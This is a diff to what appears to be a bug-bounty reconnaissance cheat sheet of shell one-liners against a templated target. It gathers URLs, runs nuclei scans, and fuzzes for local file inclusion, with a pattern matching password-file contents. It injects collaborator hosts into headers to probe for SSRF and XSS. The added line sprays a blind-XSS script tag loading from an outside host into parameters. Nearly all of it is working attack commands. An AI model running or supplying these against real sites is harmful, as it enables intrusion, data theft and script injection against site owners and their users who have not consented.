@@ -132,7 +132,7 @@ $ cat hosts_alive.txt | gau | tee gaurls.txt
 $ cat hosts_alive.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o gauplus.txt
 $ cat hosts_alive.txt | katana -d 5 | tee katana.txt
 $ cat gauplus.txt gaurls.txt katana.txt | anew all{{TARGET}}urls.txt
-$  cat all{{TARGET}}urls.txt | gf base64 >> tee base64.txt
+$ cat all{{TARGET}}urls.txt | gf base64 >> tee base64.txt
 $ cat all{{TARGET}}urls.txt | grep -E "redirect=|url=|next=|return=" | tee open_redirect_params.txt
 $ cat all{{TARGET}}urls.txt | grep -oE '(/|https?://)[^"]+\.js' | anew jsfiles.txt
 $ nuclei -l hosts_alive.txt -t ~/nuclei-templates/ -severity critical,high,medium,low | tee nuclei.txt
@@ -146,6 +146,7 @@ $ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -
 $ cat all{{TARGET}}urls.txt | grep "=" | qsreplace {{COLLAB}} | httpx
 $ cat all{{TARGET}}urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
 $ cat hosts_alive.txt | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: {{COLLAB}}'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: {{COLLAB}}'|grep xss) xss3=$(curl -s -L $url -H 'Host: {{COLLAB}}'|grep xss) xss4=$(curl -s -L $url --request-target http://{{COLLAB}}/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://{{COLLAB}} HTTP/1.1 ""\n";done
+$ cat all{{TARGET}}urls.txt | gf xss | qsreplace "'\"><script src=https://xss.report/c/aceos></script>" | httpx -silent
 $ sif -d {{TARGET}}
 
 
